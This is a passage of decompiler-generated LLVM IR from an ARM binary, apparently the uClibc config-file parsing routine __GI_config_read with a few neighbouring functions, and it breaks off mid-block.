  uselistorder i32 %v1_14ff8, { 1, 0 }
  uselistorder i32 %v6_14fa4, { 1, 0 }
  uselistorder i32 %v0_14fa4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_14fd4, { 1, 0 }
}

define i32 @function_15030(i32 %arg1) local_unnamed_addr {
dec_label_pc_15030:
  %v0_15030 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15030, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15030
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15030, %bb
  %v4_1503c = phi i32 [ %arg1, %dec_label_pc_15030 ], [ 0, %bb ]
  ret i32 %v4_1503c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15040 = load i32, i32* @r4, align 4
  %v6_15040 = load i32, i32* @r5, align 4
  %v9_15040 = load i32, i32* @r6, align 4
  %v12_15040 = load i32, i32* @r7, align 4
  %v15_15040 = load i32, i32* @r8, align 4
  %v18_15040 = load i32, i32* @sb, align 4
  %v21_15040 = load i32, i32* @sl, align 4
  %v24_15040 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15044 = icmp eq i32* %arg1, null
  store i1 %v2_15044, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15044, label %dec_label_pc_15354, label %dec_label_pc_1505c

dec_label_pc_1505c:                               ; preds = %entry
  %v1_1505c = urem i32 %arg3, 256
  store i32 %v1_1505c, i32* @sb, align 4
  %v1_15060 = udiv i32 %arg3, 256
  %v3_15064 = urem i32 %v1_15060, 256
  %v3_15068 = mul nuw nsw i32 %v1_1505c, 4
  %v1_15070 = or i32 %v3_15068, 1
  %v1_1507c = and i32 %arg3, 131072
  %v1_15080 = add nsw i32 %v1_1505c, -1
  %v1_1508c = and i32 %arg3, 262144
  store i32 %v1_1508c, i32* %r2.global-to-local, align 4
  %v1_15090 = and i32 %arg3, 65536
  store i32 %v1_15090, i32* %r3.global-to-local, align 4
  store i32 %v1_15090, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_150a0 = add i32 %arg4, 1
  store i32 %v1_150a0, i32* @sl, align 4
  %v2_15218 = icmp eq i32 %v1_1507c, 0
  %v1_15270 = inttoptr i32 %arg2 to i32*
  %v2_15288 = icmp eq i32 %v1_1508c, 0
  br label %dec_label_pc_150a4

dec_label_pc_150a4:                               ; preds = %dec_label_pc_150a4.backedge, %dec_label_pc_1505c
  %v2_150c0 = phi i32 [ %v0_150a4.pre, %dec_label_pc_150a4.backedge ], [ %tmp, %dec_label_pc_1505c ]
  %v1_150a4 = add i32 %v2_150c0, 4
  %v2_150a4 = inttoptr i32 %v1_150a4 to i32*
  %v3_150a4 = load i32, i32* %v2_150a4, align 4
  store i32 %v3_150a4, i32* %r3.global-to-local, align 4
  %v2_150a8 = icmp eq i32 %v3_150a4, 0
  store i1 %v2_150a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_150a8, label %dec_label_pc_150b0, label %dec_label_pc_150f8

dec_label_pc_150b0:                               ; preds = %dec_label_pc_150a4
  %v1_150b0 = add i32 %v2_150c0, 16
  %v2_150b0 = inttoptr i32 %v1_150b0 to i32*
  %v3_150b0 = load i32, i32* %v2_150b0, align 4
  store i32 %v3_150b0, i32* %r3.global-to-local, align 4
  %v2_150b4 = icmp eq i32 %v3_150b0, 0
  store i1 %v2_150b4, i1* %cpsr_z.global-to-local, align 1
  %v1_150b8 = add i32 %v2_150c0, 8
  %v2_150b8 = inttoptr i32 %v1_150b8 to i32*
  %v3_150b8 = load i32, i32* %v2_150b8, align 4
  store i32 %v3_150b8, i32* %r3.global-to-local, align 4
  br i1 %v2_150b4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_150b0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_150b0, align 4
  %v0_150c4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_150b0, %bb
  %v0_150c4 = phi i32 [ %v0_150c4.pre, %bb ], [ %v3_150b8, %dec_label_pc_150b0 ]
  %v2_150c4 = icmp eq i32 %v0_150c4, 0
  store i1 %v2_150c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_150c4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_15070, i32* %r3.global-to-local, align 4
  %v2_150cc = load i32, i32* @r5, align 4
  %v3_150cc = add i32 %v2_150cc, 8
  %v4_150cc = inttoptr i32 %v3_150cc to i32*
  store i32 %v1_15070, i32* %v4_150cc, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_150d0 = load i32, i32* @r5, align 4
  %v1_150d0 = add i32 %v0_150d0, 16
  %v2_150d0 = inttoptr i32 %v1_150d0 to i32*
  %v3_150d0 = load i32, i32* %v2_150d0, align 4
  store i32 %v3_150d0, i32* %r0.global-to-local, align 4
  %v1_150d4 = add i32 %v0_150d0, 8
  %v2_150d4 = inttoptr i32 %v1_150d4 to i32*
  %v3_150d4 = load i32, i32* %v2_150d4, align 4
  store i32 %v3_150d4, i32* %r3.global-to-local, align 4
  %v2_150d8 = add i32 %v3_150d4, %v3_150d0
  store i32 %v2_150d8, i32* @r0, align 4
  %v0_150dc = call i32 @malloc()
  store i32 %v0_150dc, i32* %r0.global-to-local, align 4
  %v2_150e0 = icmp eq i32 %v0_150dc, 0
  store i1 %v2_150e0, i1* %cpsr_z.global-to-local, align 1
  %v1_150e4 = load i32, i32* @r5, align 4
  %v2_150e4 = add i32 %v1_150e4, 4
  %v3_150e4 = inttoptr i32 %v2_150e4 to i32*
  store i32 %v0_150dc, i32* %v3_150e4, align 4
  br i1 %v2_150e0, label %dec_label_pc_15354, label %dec_label_pc_150ec

dec_label_pc_150ec:                               ; preds = %.thread
  %v0_150ec = load i32, i32* @r5, align 4
  %v1_150ec = add i32 %v0_150ec, 20
  %v2_150ec = inttoptr i32 %v1_150ec to i32*
  %v3_150ec = load i32, i32* %v2_150ec, align 4
  %v1_150f0 = or i32 %v3_150ec, 1
  store i32 %v1_150f0, i32* %r3.global-to-local, align 4
  store i32 %v1_150f0, i32* %v2_150ec, align 4
  %v0_150f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_150f8

dec_label_pc_150f8:                               ; preds = %dec_label_pc_150a4, %dec_label_pc_150ec
  %v1_15100 = phi i32 [ %v2_150c0, %dec_label_pc_150a4 ], [ %v0_150f8.pre, %dec_label_pc_150ec ]
  %v1_150f8 = add i32 %v1_15100, 4
  %v2_150f8 = inttoptr i32 %v1_150f8 to i32*
  %v3_150f8 = load i32, i32* %v2_150f8, align 4
  store i32 %v3_150f8, i32* %r2.global-to-local, align 4
  %v4_150f8 = add i32 %v1_15100, 8
  %v5_150f8 = inttoptr i32 %v4_150f8 to i32*
  %v6_150f8 = load i32, i32* %v5_150f8, align 4
  %v2_150fc = add i32 %v6_150f8, %v3_150f8
  store i32 %v2_150fc, i32* %r3.global-to-local, align 4
  %v2_15100 = add i32 %v1_15100, 12
  %v3_15100 = inttoptr i32 %v2_15100 to i32*
  store i32 %v2_150fc, i32* %v3_15100, align 4
  %v0_15104 = load i32, i32* @fp, align 4
  store i32 %v0_15104, i32* @r6, align 4
  br label %dec_label_pc_15108

dec_label_pc_15108:                               ; preds = %dec_label_pc_15194, %dec_label_pc_15180, %dec_label_pc_150f8
  %v0_15110 = phi i32 [ %v0_15104, %dec_label_pc_150f8 ], [ %v1_15180, %dec_label_pc_15180 ], [ %v0_15110.pre.pre, %dec_label_pc_15194 ]
  %v0_15108 = load i32, i32* @r5, align 4
  %v1_15108 = add i32 %v0_15108, 12
  store i32 %v1_15108, i32* %r0.global-to-local, align 4
  %v1_1510c = inttoptr i32 %v1_15108 to i32*
  %v2_1510c = load i32, i32* %v1_1510c, align 4
  store i32 %v2_1510c, i32* %r0.global-to-local, align 4
  %v3_1510c = add i32 %v0_15108, 16
  %v4_1510c = inttoptr i32 %v3_1510c to i32*
  %v5_1510c = load i32, i32* %v4_1510c, align 4
  %v2_15110 = add i32 %v2_1510c, %v0_15110
  store i32 %v2_15110, i32* %r0.global-to-local, align 4
  %v2_15114 = sub i32 %v5_1510c, %v0_15110
  %v1_15118 = inttoptr i32 %v0_15108 to i32*
  %v2_15118 = load i32, i32* %v1_15118, align 4
  store i32 %v2_15118, i32* %r2.global-to-local, align 4
  %v3_1511c = call i32 @fgets(i32 %v2_15110, i32 %v2_15114, i32 %v2_15118)
  store i32 %v3_1511c, i32* %r0.global-to-local, align 4
  store i32 %v3_1511c, i32* %r4.global-to-local, align 4
  %v2_15120 = icmp eq i32 %v3_1511c, 0
  store i1 %v2_15120, i1* %cpsr_z.global-to-local, align 1
  %v0_15128 = load i32, i32* @r5, align 4
  %v1_15128 = add i32 %v0_15128, 12
  br i1 %v2_15120, label %dec_label_pc_15128, label %dec_label_pc_15140

dec_label_pc_15128:                               ; preds = %dec_label_pc_15108
  store i32 %v1_15128, i32* %r0.global-to-local, align 4
  %v1_1512c = inttoptr i32 %v1_15128 to i32*
  %v2_1512c = load i32, i32* %v1_1512c, align 4
  store i32 %v2_1512c, i32* %r0.global-to-local, align 4
  %v3_1512c = add i32 %v0_15128, 16
  %v4_1512c = inttoptr i32 %v3_1512c to i32*
  %v5_1512c = load i32, i32* %v4_1512c, align 4
  store i32 %v5_1512c, i32* %r2.global-to-local, align 4
  %v3_15134 = inttoptr i32 %v2_1512c to i8*
  %v4_15134 = call i32 @__GI_memset(i8* %v3_15134, i32 0, i32 %v5_1512c)
  store i32 %v4_15134, i32* %r0.global-to-local, align 4
  %v0_15138 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15358

dec_label_pc_15140:                               ; preds = %dec_label_pc_15108
  %v2_15140 = inttoptr i32 %v1_15128 to i32*
  %v3_15140 = load i32, i32* %v2_15140, align 4
  store i32 %v3_15140, i32* @r4, align 4
  %v1_15144 = load i32, i32* @r6, align 4
  %v2_15144 = add i32 %v1_15144, %v3_15140
  %v3_15144 = inttoptr i32 %v2_15144 to i8*
  store i32 %v2_15144, i32* %r0.global-to-local, align 4
  %v3_15148 = call i32 @strlen(i8* %v3_15144)
  %v0_15150 = load i32, i32* @r6, align 4
  %v2_15150 = add i32 %v0_15150, %v3_15148
  store i32 %v2_15150, i32* @r6, align 4
  %v0_15154 = load i32, i32* @r4, align 4
  store i32 %v0_15154, i32* @r0, align 4
  %v2_15158 = call i32 @__GI_strchr(i32 %v0_15154, i32 10)
  store i32 %v2_15158, i32* %r0.global-to-local, align 4
  %v2_1515c = icmp eq i32 %v2_15158, 0
  store i1 %v2_1515c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1515c, label %dec_label_pc_15188, label %dec_label_pc_15164

dec_label_pc_15164:                               ; preds = %dec_label_pc_15140
  %v1_15164 = inttoptr i32 %v2_15158 to i8*
  %v2_15164 = load i8, i8* %v1_15164, align 1
  %v3_15164 = zext i8 %v2_15164 to i32
  %v1_15168 = add nuw nsw i32 %v3_15164, 255
  %v1_1516c = urem i32 %v1_15168, 256
  store i32 %v1_1516c, i32* %r3.global-to-local, align 4
  %v7_15170 = icmp eq i32 %v1_1516c, 92
  store i1 %v7_15170, i1* %cpsr_z.global-to-local, align 1
  %v1_15174 = trunc i32 %v1_15168 to i8
  store i8 %v1_15174, i8* %v1_15164, align 1
  %v0_15178 = load i32, i32* @r6, align 4
  %v1_15178 = add i32 %v0_15178, -1
  store i32 %v1_15178, i32* @r6, align 4
  %v0_1517c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1517c, label %dec_label_pc_15180, label %dec_label_pc_1520c

dec_label_pc_15180:                               ; preds = %dec_label_pc_15164
  %v1_15180 = add i32 %v0_15178, -2
  store i32 %v1_15180, i32* @r6, align 4
  br label %dec_label_pc_15108

dec_label_pc_15188:                               ; preds = %dec_label_pc_15140
  %v0_15188 = load i32, i32* @r5, align 4
  %v1_15188 = add i32 %v0_15188, 20
  %v2_15188 = inttoptr i32 %v1_15188 to i32*
  %v3_15188 = load i32, i32* %v2_15188, align 4
  store i32 %v3_15188, i32* %r3.global-to-local, align 4
  %v2_1518c = icmp eq i32 %v3_15188, 0
  store i1 %v2_1518c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1518c, label %dec_label_pc_151c4, label %dec_label_pc_15194

dec_label_pc_15194:                               ; preds = %dec_label_pc_15188
  %v1_15194 = add i32 %v0_15188, 16
  %v2_15194 = inttoptr i32 %v1_15194 to i32*
  %v3_15194 = load i32, i32* %v2_15194, align 4
  store i32 %v3_15194, i32* %r3.global-to-local, align 4
  %v1_15198 = add i32 %v0_15188, 8
  %v2_15198 = inttoptr i32 %v1_15198 to i32*
  %v3_15198 = load i32, i32* %v2_15198, align 4
  %v1_1519c = add i32 %v3_15194, 4096
  store i32 %v1_1519c, i32* %r3.global-to-local, align 4
  %v2_151a0 = add i32 %v3_15198, %v1_1519c
  store i32 %v1_1519c, i32* %v2_15194, align 4
  %v0_151a8 = load i32, i32* @r5, align 4
  %v1_151a8 = add i32 %v0_151a8, 4
  %v2_151a8 = inttoptr i32 %v1_151a8 to i32*
  %v3_151a8 = load i32, i32* %v2_151a8, align 4
  store i32 %v3_151a8, i32* %r0.global-to-local, align 4
  %v4_151ac = inttoptr i32 %v3_151a8 to i32*
  %v5_151ac = call i32 @realloc(i32* %v4_151ac, i32 %v2_151a0, i32 %v2_15118, i32 %v1_1519c)
  store i32 %v5_151ac, i32* %r0.global-to-local, align 4
  %v0_151b0 = load i32, i32* @r5, align 4
  %v1_151b0 = add i32 %v0_151b0, 8
  %v2_151b0 = inttoptr i32 %v1_151b0 to i32*
  %v3_151b0 = load i32, i32* %v2_151b0, align 4
  %v2_151b4 = add i32 %v3_151b0, %v5_151ac
  store i32 %v2_151b4, i32* %r3.global-to-local, align 4
  %v2_151b8 = add i32 %v0_151b0, 12
  %v3_151b8 = inttoptr i32 %v2_151b8 to i32*
  store i32 %v2_151b4, i32* %v3_151b8, align 4
  %v1_151bc = load i32, i32* @r5, align 4
  %v2_151bc = add i32 %v1_151bc, 4
  %v3_151bc = inttoptr i32 %v2_151bc to i32*
  store i32 %v5_151ac, i32* %v3_151bc, align 4
  %v0_15110.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15108

dec_label_pc_151c4:                               ; preds = %dec_label_pc_15188, %.dec_label_pc_151c4_crit_edge
  %v0_151c4 = phi i32 [ %v0_151c4.pre, %.dec_label_pc_151c4_crit_edge ], [ %v0_15188, %dec_label_pc_15188 ]
  %v1_151c4 = inttoptr i32 %v0_151c4 to i32*
  %v2_151c4 = load i32, i32* %v1_151c4, align 4
  store i32 %v2_151c4, i32* @r1, align 4
  %v1_151c8 = add i32 %v2_151c4, 52
  %v2_151c8 = inttoptr i32 %v1_151c8 to i32*
  %v3_151c8 = load i32, i32* %v2_151c8, align 4
  store i32 %v3_151c8, i32* %r3.global-to-local, align 4
  %v2_151cc = icmp eq i32 %v3_151c8, 0
  store i1 %v2_151cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151cc, label %dec_label_pc_151f8, label %dec_label_pc_151d4

dec_label_pc_151d4:                               ; preds = %dec_label_pc_151c4
  %v1_151d4 = add i32 %v2_151c4, 16
  %v2_151d4 = inttoptr i32 %v1_151d4 to i32*
  %v3_151d4 = load i32, i32* %v2_151d4, align 4
  store i32 %v3_151d4, i32* %r2.global-to-local, align 4
  %v1_151d8 = add i32 %v2_151c4, 24
  %v2_151d8 = inttoptr i32 %v1_151d8 to i32*
  %v3_151d8 = load i32, i32* %v2_151d8, align 4
  store i32 %v3_151d8, i32* %r3.global-to-local, align 4
  %v3_151dc = icmp ult i32 %v3_151d4, %v3_151d8
  %v9_151dc = icmp eq i32 %v3_151d4, %v3_151d8
  store i1 %v9_151dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_151dc, label %dec_label_pc_15200thread-pre-split, label %dec_label_pc_151ec

dec_label_pc_151ec:                               ; preds = %dec_label_pc_151d4
  store i32 %v2_151c4, i32* %r0.global-to-local, align 4
  %v1_151f0 = inttoptr i32 %v2_151c4 to i16*
  %v2_151f0 = call i32 @getc_unlocked(i16* %v1_151f0)
  store i32 %v2_151f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15200

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151c4
  store i32 %v2_151c4, i32* %r0.global-to-local, align 4
  %v1_151fc = call i32 @__GI_fgetc(i32 %v2_151c4)
  store i32 %v1_151fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15200

dec_label_pc_15200thread-pre-split:               ; preds = %dec_label_pc_151d4
  %v2_151e0 = inttoptr i32 %v3_151d4 to i8*
  %v3_151e0 = load i8, i8* %v2_151e0, align 1
  %v4_151e0 = zext i8 %v3_151e0 to i32
  store i32 %v4_151e0, i32* %r0.global-to-local, align 4
  %v6_151e0 = add i32 %v3_151d4, 1
  store i32 %v6_151e0, i32* %r2.global-to-local, align 4
  store i32 %v6_151e0, i32* %v2_151d4, align 4
  %v0_15200.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15200

dec_label_pc_15200:                               ; preds = %dec_label_pc_15200thread-pre-split, %dec_label_pc_151ec, %dec_label_pc_151f8
  %v1_15204 = phi i32 [ %v0_15200.pr, %dec_label_pc_15200thread-pre-split ], [ %v2_151f0, %dec_label_pc_151ec ], [ %v1_151fc, %dec_label_pc_151f8 ]
  %v7_15200 = icmp eq i32 %v1_15204, 10
  store i1 %v7_15200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15200, label %dec_label_pc_1520c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15200
  %v8_15204 = icmp eq i32 %v1_15204, -1
  store i1 %v8_15204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15204, label %dec_label_pc_1520c.loopexit, label %.dec_label_pc_151c4_crit_edge

.dec_label_pc_151c4_crit_edge:                    ; preds = %bb66
  %v0_151c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_151c4

dec_label_pc_1520c.loopexit:                      ; preds = %bb66, %dec_label_pc_15200
  %v0_1520c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1520c

dec_label_pc_1520c:                               ; preds = %dec_label_pc_15164, %dec_label_pc_1520c.loopexit
  %v0_1520c = phi i32 [ %v0_1520c.pre, %dec_label_pc_1520c.loopexit ], [ %v1_15178, %dec_label_pc_15164 ]
  %v7_1520c = icmp eq i32 %v0_1520c, -1
  store i1 %v7_1520c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1520c, label %dec_label_pc_15354, label %dec_label_pc_15214

dec_label_pc_15214:                               ; preds = %dec_label_pc_1520c
  store i32 %v1_1507c, i32* %r3.global-to-local, align 4
  store i1 %v2_15218, i1* %cpsr_z.global-to-local, align 1
  %v0_1521c = load i32, i32* @r5, align 4
  %v1_1521c = add i32 %v0_1521c, 12
  %v2_1521c = inttoptr i32 %v1_1521c to i32*
  %v3_1521c = load i32, i32* %v2_1521c, align 4
  store i32 %v3_1521c, i32* @r4, align 4
  br i1 %v2_15218, label %dec_label_pc_15234, label %dec_label_pc_15224

dec_label_pc_15224:                               ; preds = %dec_label_pc_15214
  store i32 %v3_1521c, i32* @r0, align 4
  %v0_15228 = load i32, i32* @sl, align 4
  %v2_1522c = inttoptr i32 %v3_1521c to i8*
  %v3_1522c = call i32 @__GI_strspn(i8* %v2_1522c, i32 %v0_15228)
  store i32 %v3_1522c, i32* %r0.global-to-local, align 4
  %v0_15230 = load i32, i32* @r4, align 4
  %v2_15230 = add i32 %v0_15230, %v3_1522c
  store i32 %v2_15230, i32* @r4, align 4
  br label %dec_label_pc_15234

dec_label_pc_15234:                               ; preds = %dec_label_pc_15214, %dec_label_pc_15224
  %v0_15234 = phi i32 [ %v3_1521c, %dec_label_pc_15214 ], [ %v2_15230, %dec_label_pc_15224 ]
  %v1_15234 = inttoptr i32 %v0_15234 to i8*
  %v2_15234 = load i8, i8* %v1_15234, align 1
  %v3_15234 = zext i8 %v2_15234 to i32
  store i32 %v3_15234, i32* %r2.global-to-local, align 4
  %v2_15238 = icmp eq i8 %v2_15234, 0
  store i1 %v2_15238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15238, label %dec_label_pc_150a4.backedge, label %dec_label_pc_15240

dec_label_pc_150a4.backedge:                      ; preds = %dec_label_pc_15234, %dec_label_pc_15240, %dec_label_pc_1534c
  %v0_150a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_150a4

dec_label_pc_15240:                               ; preds = %dec_label_pc_15234
  %v0_15240 = load i32, i32* @r7, align 4
  %v1_15240 = inttoptr i32 %v0_15240 to i8*
  %v2_15240 = load i8, i8* %v1_15240, align 1
  %v3_15240 = zext i8 %v2_15240 to i32
  store i32 %v3_15240, i32* %r3.global-to-local, align 4
  %v9_15244 = icmp eq i8 %v2_15240, %v2_15234
  store i1 %v9_15244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15244, label %dec_label_pc_150a4.backedge, label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %dec_label_pc_15240
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15250 = load i32, i32* @r5, align 4
  %v1_15250 = add i32 %v0_15250, 4
  %v2_15250 = inttoptr i32 %v1_15250 to i32*
  %v3_15250 = load i32, i32* %v2_15250, align 4
  store i32 %v3_15250, i32* %r0.global-to-local, align 4
  %v0_15254 = load i32, i32* @fp, align 4
  store i32 %v3_15250, i32* %v1_15270, align 4
  store i32 %v3_15068, i32* %r2.global-to-local, align 4
  %v3_15260 = inttoptr i32 %v3_15250 to i8*
  %v4_15260 = call i32 @__GI_memset(i8* %v3_15260, i32 %v0_15254, i32 %v3_15068)
  store i32 %v4_15260, i32* %r0.global-to-local, align 4
  %v0_15264 = load i32, i32* @fp, align 4
  store i32 %v0_15264, i32* @r6, align 4
  %v0_1532412 = load i32, i32* @r4, align 4
  %v1_1532413 = inttoptr i32 %v0_1532412 to i8*
  %v2_1532414 = load i8, i8* %v1_1532413, align 1
  %v3_1532415 = zext i8 %v2_1532414 to i32
  store i32 %v3_1532415, i32* %r2.global-to-local, align 4
  %v2_1532816 = icmp eq i8 %v2_1532414, 0
  store i1 %v2_1532816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1532816, label %dec_label_pc_15340, label %dec_label_pc_15330

dec_label_pc_1526c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15270 = load i32, i32* %v1_15270, align 4
  store i32 %v2_15270, i32* %r3.global-to-local, align 4
  store i32 %v1_15080, i32* %r2.global-to-local, align 4
  %v9_15278 = icmp eq i32 %v2_1527c, %v1_15080
  store i1 %v9_15278, i1* %cpsr_z.global-to-local, align 1
  %v5_1527c = mul i32 %v2_1527c, 4
  %v6_1527c = add i32 %v2_15270, %v5_1527c
  %v7_1527c = inttoptr i32 %v6_1527c to i32*
  store i32 %v0_1527c, i32* %v7_1527c, align 4
  br i1 %v9_15278, label %dec_label_pc_15284, label %dec_label_pc_15290

dec_label_pc_15284:                               ; preds = %dec_label_pc_1526c
  store i32 %v1_1508c, i32* %r3.global-to-local, align 4
  store i1 %v2_15288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15288, label %dec_label_pc_15290, label %dec_label_pc_152b0

dec_label_pc_15290:                               ; preds = %dec_label_pc_15284, %dec_label_pc_1526c
  %v0_15290 = load i32, i32* @r7, align 4
  %v1_15290 = inttoptr i32 %v0_15290 to i8*
  %v2_15290 = load i8, i8* %v1_15290, align 1
  %v3_15290 = zext i8 %v2_15290 to i32
  store i32 %v3_15290, i32* %r3.global-to-local, align 4
  %v2_15294 = icmp eq i8 %v2_15290, 0
  store i1 %v2_15294, i1* %cpsr_z.global-to-local, align 1
  %v0_15298 = load i32, i32* @r4, align 4
  store i32 %v0_15298, i32* @r0, align 4
  %v1_1529c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15294, i32 %v1_1529c, i32 %v0_15290
  store i32 %storemerge, i32* @r1, align 4
  %v0_152a4 = call i32 @strcspn()
  store i32 %v0_152a4, i32* %r0.global-to-local, align 4
  %v0_152a8 = load i32, i32* @r4, align 4
  %v2_152a8 = add i32 %v0_152a8, %v0_152a4
  store i32 %v2_152a8, i32* @r4, align 4
  br label %dec_label_pc_152e8

dec_label_pc_152b0:                               ; preds = %dec_label_pc_15284
  %v0_152b0 = load i32, i32* @r4, align 4
  store i32 %v0_152b0, i32* @r0, align 4
  %v0_152b4 = load i32, i32* @r7, align 4
  %v1_152b4 = inttoptr i32 %v0_152b4 to i8*
  %v2_152b4 = load i8, i8* %v1_152b4, align 1
  %v3_152b4 = zext i8 %v2_152b4 to i32
  %v5_152b8 = call i32 @__GI_strchrnul(i32 %v0_152b0, i32 %v3_152b4, i32 %v1_15080, i32 %v1_1508c)
  store i32 %v5_152b8, i32* %r0.global-to-local, align 4
  store i32 %v1_1507c, i32* %r2.global-to-local, align 4
  store i1 %v2_15218, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_152b8, i32* @r4, align 4
  br i1 %v2_15218, label %dec_label_pc_152e8, label %dec_label_pc_152d4

dec_label_pc_152d0:                               ; preds = %dec_label_pc_152d4
  %v1_152d0 = add i32 %v0_152e8.pre, -1
  store i32 %v1_152d0, i32* @r4, align 4
  br label %dec_label_pc_152d4

dec_label_pc_152d4:                               ; preds = %dec_label_pc_152b0, %dec_label_pc_152d0
  %v0_152d4 = phi i32 [ %v1_152d0, %dec_label_pc_152d0 ], [ %v5_152b8, %dec_label_pc_152b0 ]
  %v1_152d4 = add i32 %v0_152d4, -1
  %v2_152d4 = inttoptr i32 %v1_152d4 to i8*
  %v3_152d4 = load i8, i8* %v2_152d4, align 1
  %v4_152d4 = zext i8 %v3_152d4 to i32
  %v0_152d8 = load i32, i32* @sl, align 4
  store i32 %v0_152d8, i32* @r0, align 4
  %v2_152dc = call i32 @__GI_strchr(i32 %v0_152d8, i32 %v4_152d4)
  store i32 %v2_152dc, i32* %r0.global-to-local, align 4
  %v2_152e0 = icmp eq i32 %v2_152dc, 0
  store i1 %v2_152e0, i1* %cpsr_z.global-to-local, align 1
  %v0_152e8.pre = load i32, i32* @r4, align 4
  br i1 %v2_152e0, label %dec_label_pc_152e8, label %dec_label_pc_152d0

dec_label_pc_152e8:                               ; preds = %dec_label_pc_152d4, %dec_label_pc_152b0, %dec_label_pc_15290
  %v3_152f4 = phi i32 [ %v5_152b8, %dec_label_pc_152b0 ], [ %v2_152a8, %dec_label_pc_15290 ], [ %v0_152e8.pre, %dec_label_pc_152d4 ]
  %v1_152e8 = inttoptr i32 %v3_152f4 to i8*
  %v2_152e8 = load i8, i8* %v1_152e8, align 1
  %v3_152e8 = zext i8 %v2_152e8 to i32
  store i32 %v3_152e8, i32* %r2.global-to-local, align 4
  %v0_152ec = load i32, i32* @r7, align 4
  %v1_152ec = inttoptr i32 %v0_152ec to i8*
  %v2_152ec = load i8, i8* %v1_152ec, align 1
  %v3_152ec = zext i8 %v2_152ec to i32
  store i32 %v3_152ec, i32* %r3.global-to-local, align 4
  %v9_152f0 = icmp eq i8 %v2_152ec, %v2_152e8
  store i1 %v9_152f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152f0, label %bb69, label %dec_label_pc_152fc

bb69:                                             ; preds = %dec_label_pc_152e8
  %v1_152f4 = load i32, i32* @fp, align 4
  %v2_152f4 = trunc i32 %v1_152f4 to i8
  store i8 %v2_152f4, i8* %v1_152e8, align 1
  %v0_152f8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_152f8.pr, label %bb71, label %.dec_label_pc_152fc_crit_edge

.dec_label_pc_152fc_crit_edge:                    ; preds = %bb69
  %v0_152fc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_152fc

dec_label_pc_152fc:                               ; preds = %.dec_label_pc_152fc_crit_edge, %dec_label_pc_152e8
  %v0_152fc = phi i32 [ %v0_152fc.pre, %.dec_label_pc_152fc_crit_edge ], [ %v3_152e8, %dec_label_pc_152e8 ]
  %v2_152fc = icmp eq i32 %v0_152fc, 0
  store i1 %v2_152fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_152fc, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_152fc
  %v1_15300 = load i32, i32* @fp, align 4
  %v2_15300 = trunc i32 %v1_15300 to i8
  %v3_15300 = load i32, i32* @r4, align 4
  %v4_15300 = inttoptr i32 %v3_15300 to i8*
  store i8 %v2_15300, i8* %v4_15300, align 1
  %v5_15300 = load i32, i32* @r4, align 4
  %v6_15300 = add i32 %v5_15300, 1
